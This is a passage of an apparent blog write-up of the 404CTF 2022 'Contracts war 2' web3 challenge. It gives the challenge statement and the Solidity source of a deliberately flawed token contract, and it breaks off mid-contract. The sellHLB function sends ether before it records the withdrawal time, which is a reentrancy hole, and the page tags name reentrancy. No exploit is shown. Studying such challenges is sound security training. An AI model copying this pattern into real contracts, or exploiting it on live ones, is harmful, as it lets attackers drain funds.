@@ -1,0 +1,501 @@
+<!doctype html><html lang=en-us dir=ltr><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="Writeup of web3 challenge of 404CTF 2022 - contracts war 2/2"><title>Writeup 404CTF 2022 - Contracts war 2 (web3)</title><link rel=canonical href=https://nodauf.dev/p/writeup-404ctf-2022-contracts-war-2-web3/><link rel=stylesheet href=/scss/style.min.ab594365046e8eb0834fe81656e6bbd55da4a04e72b448cfafe558effd507412.css><meta property="og:title" content="Writeup 404CTF 2022 - Contracts war 2 (web3)"><meta property="og:description" content="Writeup of web3 challenge of 404CTF 2022 - contracts war 2/2"><meta property="og:url" content="https://nodauf.dev/p/writeup-404ctf-2022-contracts-war-2-web3/"><meta property="og:site_name" content="Nodauf"><meta property="og:type" content="article"><meta property="article:section" content="Post"><meta property="article:tag" content="foundry"><meta property="article:tag" content="solidity"><meta property="article:tag" content="reentrancy"><meta property="article:tag" content="web3"><meta property="article:published_time" content="2022-05-18T00:00:00+00:00"><meta property="article:modified_time" content="2022-05-18T00:00:00+00:00"><meta property="og:image" content="https://nodauf.dev/images/404CTF.png"><meta name=twitter:title content="Writeup 404CTF 2022 - Contracts war 2 (web3)"><meta name=twitter:description content="Writeup of web3 challenge of 404CTF 2022 - contracts war 2/2"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://nodauf.dev/images/404CTF.png"></head><body class=article-page><script>(function(){const e='StackColorScheme';localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t='StackColorScheme',e=localStorage.getItem(t),n=window.matchMedia('(prefers-color-scheme: dark)').matches===!0;e=='dark'||e==='auto'&&n?document.documentElement.dataset.scheme='dark':document.documentElement.dataset.scheme='light'})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
+<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><div class=site-meta><h1 class=site-name><a href=/>Nodauf</a></h1><h2 class=site-description>Pentester, perpetual student and security enthusiast. Passionnate about security, AD and more ...</h2></div></header><ol class=social-menu><li><a href=https://github.com/nodauf target=_blank title=GitHub><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href=https://twitter.com/nodauf target=_blank title=Twitter><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M22 4.01c-1 .49-1.98.689-3 .99-1.121-1.265-2.783-1.335-4.38-.737S11.977 6.323 12 8v1c-3.245.083-6.135-1.395-8-4 0 0-4.182 7.433 4 11-1.872 1.247-3.739 2.088-6 2 3.308 1.803 6.913 2.423 10.034 1.517 3.58-1.04 6.522-3.723 7.651-7.742a13.84 13.84.0 00.497-3.753C20.18 7.773 21.692 5.25 22 4.009z"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/archives/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg><span>Archives</span></a></li><li><a href=/search/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg><span>Search</span></a></li><div class=menu-bottom-section><li id=dark-mode-toggle><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg><span>Dark Mode</span></li></div></ol></aside><main class="main full-width"><article class="has-image main-article"><header class=article-header><div class=article-image><a href=/p/writeup-404ctf-2022-contracts-war-2-web3/><img src=/images/404CTF.png loading=lazy alt="Featured image of post Writeup 404CTF 2022 - Contracts war 2 (web3)"></a></div><div class=article-details><header class=article-category><a href=/categories/ctf/ style=background-color:#26a0f0;color:#fff>CTF writeups</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/writeup-404ctf-2022-contracts-war-2-web3/>Writeup 404CTF 2022 - Contracts war 2 (web3)</a></h2><h3 class=article-subtitle>Writeup of web3 challenge of 404CTF 2022 - contracts war 2/2</h3></div><footer class=article-time><div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg><time class=article-time--published>May 18, 2022</time></div><div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg><time class=article-time--reading>8 minute read</time></div></footer></div></header><section class=article-content><h1 id=statement>Statement</h1><p>The challenge statement is as follows:</p><blockquote><p>Agent, maintenant que vous avez des compétences un peu plus approfondies en web3, nous aimerions faire appel à vos compétences dans une situation plus délicate. Nous avons décelé des traces d&rsquo;activités suspectes à l&rsquo;adresse 0xD5c0873f147cECF336fEEF1a28474716C745Df86. Hallebarde essaye apparemment de créer sa propre cryptomonnaie. De plus, il semble que les plus anciens membres de Hallebarde puissent récupérer une sorte de pass VIP. Utilisez ce pass pour obtenir des informations seulement connues par l&rsquo;élite de Hallebarde.</p><p>Contrat à l&rsquo;adresse : 0xD5c0873f147cECF336fEEF1a28474716C745Df86</p><p>Réseau de test Ropsten</p><p>Auteur : Soremo</p><p>nc challenge.404ctf.fr 30885</p></blockquote><p>The source code of the smart contract is given:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
+</span><span class=lnt>  2
+</span><span class=lnt>  3
+</span><span class=lnt>  4
+</span><span class=lnt>  5
+</span><span class=lnt>  6
+</span><span class=lnt>  7
+</span><span class=lnt>  8
+</span><span class=lnt>  9
+</span><span class=lnt> 10
+</span><span class=lnt> 11
+</span><span class=lnt> 12
+</span><span class=lnt> 13
+</span><span class=lnt> 14
+</span><span class=lnt> 15
+</span><span class=lnt> 16
+</span><span class=lnt> 17
+</span><span class=lnt> 18
+</span><span class=lnt> 19
+</span><span class=lnt> 20
+</span><span class=lnt> 21
+</span><span class=lnt> 22
+</span><span class=lnt> 23
+</span><span class=lnt> 24
+</span><span class=lnt> 25
+</span><span class=lnt> 26
+</span><span class=lnt> 27
+</span><span class=lnt> 28
+</span><span class=lnt> 29
+</span><span class=lnt> 30
+</span><span class=lnt> 31
+</span><span class=lnt> 32
+</span><span class=lnt> 33
+</span><span class=lnt> 34
+</span><span class=lnt> 35
+</span><span class=lnt> 36
+</span><span class=lnt> 37
+</span><span class=lnt> 38
+</span><span class=lnt> 39
+</span><span class=lnt> 40
+</span><span class=lnt> 41
+</span><span class=lnt> 42
+</span><span class=lnt> 43
+</span><span class=lnt> 44
+</span><span class=lnt> 45
+</span><span class=lnt> 46
+</span><span class=lnt> 47
+</span><span class=lnt> 48
+</span><span class=lnt> 49
+</span><span class=lnt> 50
+</span><span class=lnt> 51
+</span><span class=lnt> 52
+</span><span class=lnt> 53
+</span><span class=lnt> 54
+</span><span class=lnt> 55
+</span><span class=lnt> 56
+</span><span class=lnt> 57
+</span><span class=lnt> 58
+</span><span class=lnt> 59
+</span><span class=lnt> 60
+</span><span class=lnt> 61
+</span><span class=lnt> 62
+</span><span class=lnt> 63
+</span><span class=lnt> 64
+</span><span class=lnt> 65
+</span><span class=lnt> 66
+</span><span class=lnt> 67
+</span><span class=lnt> 68
+</span><span class=lnt> 69
+</span><span class=lnt> 70
+</span><span class=lnt> 71
+</span><span class=lnt> 72
+</span><span class=lnt> 73
+</span><span class=lnt> 74
+</span><span class=lnt> 75
+</span><span class=lnt> 76
+</span><span class=lnt> 77
+</span><span class=lnt> 78
+</span><span class=lnt> 79
+</span><span class=lnt> 80
+</span><span class=lnt> 81
+</span><span class=lnt> 82
+</span><span class=lnt> 83
+</span><span class=lnt> 84
+</span><span class=lnt> 85
+</span><span class=lnt> 86
+</span><span class=lnt> 87
+</span><span class=lnt> 88
+</span><span class=lnt> 89
+</span><span class=lnt> 90
+</span><span class=lnt> 91
+</span><span class=lnt> 92
+</span><span class=lnt> 93
+</span><span class=lnt> 94
+</span><span class=lnt> 95
+</span><span class=lnt> 96
+</span><span class=lnt> 97
+</span><span class=lnt> 98
+</span><span class=lnt> 99
+</span><span class=lnt>100
+</span><span class=lnt>101
+</span><span class=lnt>102
+</span><span class=lnt>103
+</span><span class=lnt>104
+</span><span class=lnt>105
+</span><span class=lnt>106
+</span><span class=lnt>107
+</span><span class=lnt>108
+</span><span class=lnt>109
+</span><span class=lnt>110
+</span><span class=lnt>111
+</span><span class=lnt>112
+</span><span class=lnt>113
+</span><span class=lnt>114
+</span><span class=lnt>115
+</span><span class=lnt>116
+</span><span class=lnt>117
+</span><span class=lnt>118
+</span><span class=lnt>119
+</span><span class=lnt>120
+</span><span class=lnt>121
+</span><span class=lnt>122
+</span><span class=lnt>123
+</span><span class=lnt>124
+</span><span class=lnt>125
+</span><span class=lnt>126
+</span><span class=lnt>127
+</span><span class=lnt>128
+</span><span class=lnt>129
+</span><span class=lnt>130
+</span><span class=lnt>131
+</span><span class=lnt>132
+</span><span class=lnt>133
+</span><span class=lnt>134
+</span><span class=lnt>135
+</span><span class=lnt>136
+</span><span class=lnt>137
+</span><span class=lnt>138
+</span><span class=lnt>139
+</span><span class=lnt>140
+</span><span class=lnt>141
+</span><span class=lnt>142
+</span><span class=lnt>143
+</span><span class=lnt>144
+</span><span class=lnt>145
+</span><span class=lnt>146
+</span><span class=lnt>147
+</span><span class=lnt>148
+</span><span class=lnt>149
+</span><span class=lnt>150
+</span><span class=lnt>151
+</span><span class=lnt>152
+</span><span class=lnt>153
+</span><span class=lnt>154
+</span><span class=lnt>155
+</span><span class=lnt>156
+</span><span class=lnt>157
+</span><span class=lnt>158
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=cl><span class=k>pragma solidity</span> <span class=mi>0</span><span class=p>.</span><span class=mi>8</span><span class=p>.</span><span class=mi>13</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=c1>// solidity &gt; 0.8.0 is using SafeMath by default. No integer underflow or overflow.
+</span></span></span><span class=line><span class=cl><span class=c1></span>
+</span></span><span class=line><span class=cl><span class=kd>interface</span> <span class=nc>IERC20</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>totalSupply</span><span class=p>()</span> <span class=k>external</span> <span class=k>view</span> <span class=k>returns</span> <span class=p>(</span><span class=kt>uint256</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>balanceOf</span><span class=p>(</span><span class=kt>address</span> <span class=n>account</span><span class=p>)</span> <span class=k>external</span> <span class=k>view</span> <span class=k>returns</span> <span class=p>(</span><span class=kt>uint256</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>allowance</span><span class=p>(</span><span class=kt>address</span> <span class=n>owner</span><span class=p>,</span> <span class=kt>address</span> <span class=n>spender</span><span class=p>)</span> <span class=k>external</span> <span class=k>view</span> <span class=k>returns</span> <span class=p>(</span><span class=kt>uint256</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>transfer</span><span class=p>(</span><span class=kt>address</span> <span class=n>recipient</span><span class=p>,</span> <span class=kt>uint256</span> <span class=n>amount</span><span class=p>)</span> <span class=k>external</span> <span class=k>returns</span> <span class=p>(</span><span class=kt>bool</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>approve</span><span class=p>(</span><span class=kt>address</span> <span class=n>spender</span><span class=p>,</span> <span class=kt>uint256</span> <span class=n>amount</span><span class=p>)</span> <span class=k>external</span> <span class=k>returns</span> <span class=p>(</span><span class=kt>bool</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>transferFrom</span><span class=p>(</span><span class=kt>address</span> <span class=nb>sender</span><span class=p>,</span> <span class=kt>address</span> <span class=n>recipient</span><span class=p>,</span> <span class=kt>uint256</span> <span class=n>amount</span><span class=p>)</span> <span class=k>external</span> <span class=k>returns</span> <span class=p>(</span><span class=kt>bool</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=kd>event</span> <span class=nc>Transfer</span><span class=p>(</span><span class=kt>address</span> <span class=k>indexed</span> <span class=k>from</span><span class=p>,</span> <span class=kt>address</span> <span class=k>indexed</span> <span class=n>to</span><span class=p>,</span> <span class=kt>uint256</span> <span class=nb>value</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=kd>event</span> <span class=nc>Approval</span><span class=p>(</span><span class=kt>address</span> <span class=k>indexed</span> <span class=n>owner</span><span class=p>,</span> <span class=kt>address</span> <span class=k>indexed</span> <span class=n>spender</span><span class=p>,</span> <span class=kt>uint256</span> <span class=nb>value</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kd>contract</span> <span class=nc>HallebardeToken</span> <span class=k>is</span> <span class=n>IERC20</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=kn>using</span> <span class=n>SafeMath</span> <span class=k>for</span> <span class=kt>uint256</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=kt>string</span> <span class=k>public</span> <span class=k>constant</span> <span class=nb>name</span> <span class=o>=</span> <span class=s>&#34;Hallebarde&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=kt>string</span> <span class=k>public</span> <span class=k>constant</span> <span class=n>symbol</span> <span class=o>=</span> <span class=s>&#34;HLB&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=kt>uint8</span> <span class=k>public</span> <span class=k>constant</span> <span class=n>decimals</span> <span class=o>=</span> <span class=mi>18</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=kd>mapping</span><span class=p>(</span><span class=kt>address</span> <span class=o>=&gt;</span> <span class=kt>uint256</span><span class=p>)</span> <span class=n>balances</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=kd>mapping</span><span class=p>(</span><span class=kt>address</span> <span class=o>=&gt;</span> <span class=kd>mapping</span> <span class=p>(</span><span class=kt>address</span> <span class=o>=&gt;</span> <span class=kt>uint256</span><span class=p>))</span> <span class=n>allowed</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=kd>mapping</span><span class=p>(</span><span class=kt>address</span> <span class=o>=&gt;</span> <span class=kt>uint256</span><span class=p>)</span> <span class=n>seniority</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=kd>mapping</span><span class=p>(</span><span class=kt>address</span> <span class=o>=&gt;</span> <span class=kt>uint256</span><span class=p>)</span> <span class=n>lastWithdrawTime</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=kt>uint256</span> <span class=k>private</span> <span class=n>vipPass</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=kt>address</span> <span class=k>private</span> <span class=n>boss</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=kt>uint256</span> <span class=n>totalSupply_</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=kd>constructor</span><span class=p>(</span><span class=kt>string</span> <span class=k>memory</span> <span class=n>_password</span><span class=p>)</span> <span class=k>public</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>   <span class=n>totalSupply_</span> <span class=o>=</span> <span class=mi>1000000</span> <span class=kc>ether</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>   <span class=n>balances</span><span class=p>[</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>]</span> <span class=o>=</span> <span class=mi>1000</span> <span class=kc>ether</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>   <span class=n>balances</span><span class=p>[</span><span class=kt>address</span><span class=p>(</span><span class=nb>this</span><span class=p>)]</span> <span class=o>=</span> <span class=mi>999000</span> <span class=kc>ether</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>   <span class=n>seniority</span><span class=p>[</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>]</span> <span class=o>=</span> <span class=mi>10</span><span class=o>*</span><span class=mi>365</span> <span class=kc>days</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>   <span class=n>boss</span> <span class=o>=</span> <span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>   <span class=n>rand</span><span class=p>(</span><span class=n>_password</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>rand</span><span class=p>(</span><span class=kt>string</span> <span class=k>memory</span> <span class=n>_password</span><span class=p>)</span> <span class=k>public</span> <span class=n>onlyOwner</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>   <span class=n>vipPass</span> <span class=o>=</span> <span class=kt>uint</span><span class=p>(</span><span class=nb>keccak256</span><span class=p>(</span><span class=nb>abi</span><span class=p>.</span><span class=nb>encodePacked</span><span class=p>(</span>
+</span></span><span class=line><span class=cl>   <span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>   <span class=nb>block</span><span class=p>.</span><span class=nb>timestamp</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>   <span class=nb>block</span><span class=p>.</span><span class=nb>difficulty</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>   <span class=n>vipPass</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>   <span class=n>balances</span><span class=p>[</span><span class=kt>address</span><span class=p>(</span><span class=nb>this</span><span class=p>)],</span>
+</span></span><span class=line><span class=cl>   <span class=n>_password</span><span class=p>)));</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>totalSupply</span><span class=p>()</span> <span class=k>public</span> <span class=k>override</span> <span class=k>view</span> <span class=k>returns</span> <span class=p>(</span><span class=kt>uint256</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>   <span class=k>return</span> <span class=n>totalSupply_</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>balanceOf</span><span class=p>(</span><span class=kt>address</span> <span class=n>tokenOwner</span><span class=p>)</span> <span class=k>public</span> <span class=k>override</span> <span class=k>view</span> <span class=k>returns</span> <span class=p>(</span><span class=kt>uint256</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>   <span class=k>return</span> <span class=n>balances</span><span class=p>[</span><span class=n>tokenOwner</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>seniorityOf</span><span class=p>(</span><span class=kt>address</span> <span class=n>tokenOwner</span><span class=p>)</span> <span class=k>public</span> <span class=k>view</span> <span class=k>returns</span> <span class=p>(</span><span class=kt>uint256</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>   <span class=k>return</span> <span class=n>seniority</span><span class=p>[</span><span class=n>tokenOwner</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1>// buyHLB to get HLB token.
+</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=kd>function</span> <span class=nf>buyHLB</span><span class=p>()</span> <span class=k>public</span> <span class=k>payable</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>   <span class=nb>require</span><span class=p>(</span><span class=nb>msg</span><span class=p>.</span><span class=nb>value</span> <span class=o>&gt;</span> <span class=mi>0</span><span class=p>,</span> <span class=s>&#34;Vous avez besoin d&#39;ethereum pour acheter des HLB.&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>   <span class=nb>require</span><span class=p>(</span><span class=n>balances</span><span class=p>[</span><span class=kt>address</span><span class=p>(</span><span class=nb>this</span><span class=p>)]</span> <span class=o>&gt;=</span> <span class=nb>msg</span><span class=p>.</span><span class=nb>value</span><span class=p>,</span> <span class=s>&#34;Il n&#39;y a plus assez de HLB disponible. Revenez plus tard.&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>   <span class=n>balances</span><span class=p>[</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>]</span> <span class=o>=</span> <span class=n>balances</span><span class=p>[</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>].</span><span class=n>add</span><span class=p>(</span><span class=nb>msg</span><span class=p>.</span><span class=nb>value</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>   <span class=n>balances</span><span class=p>[</span><span class=kt>address</span><span class=p>(</span><span class=nb>this</span><span class=p>)]</span> <span class=o>=</span> <span class=n>balances</span><span class=p>[</span><span class=kt>address</span><span class=p>(</span><span class=nb>this</span><span class=p>)].</span><span class=n>sub</span><span class=p>(</span><span class=nb>msg</span><span class=p>.</span><span class=nb>value</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1>// sellHLB to sell HLB token. We can sell token once per year.
+</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=kd>function</span> <span class=nf>sellHLB</span><span class=p>(</span><span class=kt>uint256</span> <span class=n>numTokens</span><span class=p>)</span> <span class=k>public</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>   <span class=c1>// Check if we have enough token to sell
+</span></span></span><span class=line><span class=cl><span class=c1></span>   <span class=nb>require</span><span class=p>(</span><span class=n>balances</span><span class=p>[</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>]</span> <span class=o>&gt;=</span> <span class=n>numTokens</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>   <span class=c1>// Check the last time we sold HLB
+</span></span></span><span class=line><span class=cl><span class=c1></span>   <span class=nb>require</span><span class=p>(</span><span class=nb>block</span><span class=p>.</span><span class=nb>timestamp</span> <span class=o>&gt;=</span> <span class=n>lastWithdrawTime</span><span class=p>[</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>]</span> <span class=o>+</span> <span class=mi>365</span> <span class=kc>days</span><span class=p>,</span> <span class=s>&#34;Vous devez attendre un an entre chaque retrait.&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>   <span class=c1>// Call the function transfer below to update the balance of the receiver and the sender.
+</span></span></span><span class=line><span class=cl><span class=c1></span>   <span class=nb>transfer</span><span class=p>(</span><span class=kt>address</span><span class=p>(</span><span class=nb>this</span><span class=p>),</span> <span class=n>numTokens</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>   <span class=c1>// Update the seniroty of the user. The seniority is used to get the vip pass.
+</span></span></span><span class=line><span class=cl><span class=c1></span>   <span class=n>seniority</span><span class=p>[</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>]</span> <span class=o>=</span> <span class=n>seniority</span><span class=p>[</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>].</span><span class=n>add</span><span class=p>(</span><span class=mi>365</span> <span class=kc>days</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>   <span class=c1>// Send ether to the remote address. The fallback function is used to send ether to the contract.
+</span></span></span><span class=line><span class=cl><span class=c1></span>   <span class=p>(</span><span class=kt>bool</span> <span class=n>sent</span><span class=p>,</span> <span class=p>)</span> <span class=o>=</span> <span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>.</span><span class=nb>call</span><span class=p>{</span><span class=nb>value</span><span class=o>:</span> <span class=n>numTokens</span><span class=p>}(</span><span class=s>&#34;&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>   <span class=nb>require</span><span class=p>(</span><span class=n>sent</span><span class=p>,</span> <span class=s>&#34;Erreur lors de l&#39;envoi de l&#39;ethereum.&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>   <span class=c1>// Update the last time we sold HLB. This is used to check if we can sell HLB again.
+</span></span></span><span class=line><span class=cl><span class=c1></span>   <span class=n>lastWithdrawTime</span><span class=p>[</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>]</span> <span class=o>=</span> <span class=nb>block</span><span class=p>.</span><span class=nb>timestamp</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>transfer</span><span class=p>(</span><span class=kt>address</span> <span class=n>receiver</span><span class=p>,</span> <span class=kt>uint256</span> <span class=n>numTokens</span><span class=p>)</span> <span class=k>public</span> <span class=k>override</span> <span class=k>returns</span> <span class=p>(</span><span class=kt>bool</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>   <span class=nb>require</span><span class=p>(</span><span class=n>numTokens</span> <span class=o>&lt;=</span> <span class=n>balances</span><span class=p>[</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>]);</span>
+</span></span><span class=line><span class=cl>   <span class=n>balances</span><span class=p>[</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>]</span> <span class=o>=</span> <span class=n>balances</span><span class=p>[</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>].</span><span class=n>sub</span><span class=p>(</span><span class=n>numTokens</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>   <span class=n>balances</span><span class=p>[</span><span class=n>receiver</span><span class=p>]</span> <span class=o>=</span> <span class=n>balances</span><span class=p>[</span><span class=n>receiver</span><span class=p>].</span><span class=n>add</span><span class=p>(</span><span class=n>numTokens</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>   <span class=n>emit</span> <span class=n>Transfer</span><span class=p>(</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>,</span> <span class=n>receiver</span><span class=p>,</span> <span class=n>numTokens</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>   <span class=k>return</span> <span class=kc>true</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>approve</span><span class=p>(</span><span class=kt>address</span> <span class=n>delegate</span><span class=p>,</span> <span class=kt>uint256</span> <span class=n>numTokens</span><span class=p>)</span> <span class=k>public</span> <span class=k>override</span> <span class=k>returns</span> <span class=p>(</span><span class=kt>bool</span><span class=p>)</span> <span class=p>{</span>
